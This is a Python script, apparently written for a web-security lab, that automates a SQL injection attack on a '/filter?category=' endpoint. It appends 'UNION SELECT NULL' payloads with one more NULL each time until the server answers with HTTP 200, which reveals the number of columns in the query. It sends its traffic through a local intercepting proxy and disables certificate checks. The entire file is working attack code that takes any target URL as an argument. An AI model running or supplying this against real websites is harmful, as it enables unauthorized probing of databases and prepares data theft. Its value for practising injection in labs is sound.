#!/usr/bin/python3
#This program uses UNION SELECT NULL method to find out the number of columns 
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36'}
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

def exploit_sqli_column_number(url):
	path = "/filter?category="+category
	addendum = "NULL"
	for i in range(1,50):
		sql_payload = "'+UNION+SELECT+%s-- " %addendum
		print ("[+] Trying a value of "+str(i)+"...", end =" ")
		r = requests.get(url + path+ sql_payload, verify=False, proxies=proxies, headers=headers)
		#res = r.text
		status = r.status_code
		print("Status: "+str(status))
		if status == 200:
			return i
		addendum = addendum + ",+NULL"
		i = i+1
	return False	

if __name__=="__main__":
	try:
		url = sys.argv[1].strip()
		category = sys.argv[2].strip()
	except IndexError:
		print("[-] Usage: %s <url> <category>" % sys.argv[0])
		print("[-] Example: %s www.example.com \"pets\"" % sys.argv[0])
		sys.exit (-1)
		
	print ("[+] Figuring out number of columns...")
	num_col = exploit_sqli_column_number(url)
	if num_col:
		print("[+] The number of Columns is " +str(num_col)+".")
	else:
		print("[+] Not succesful")
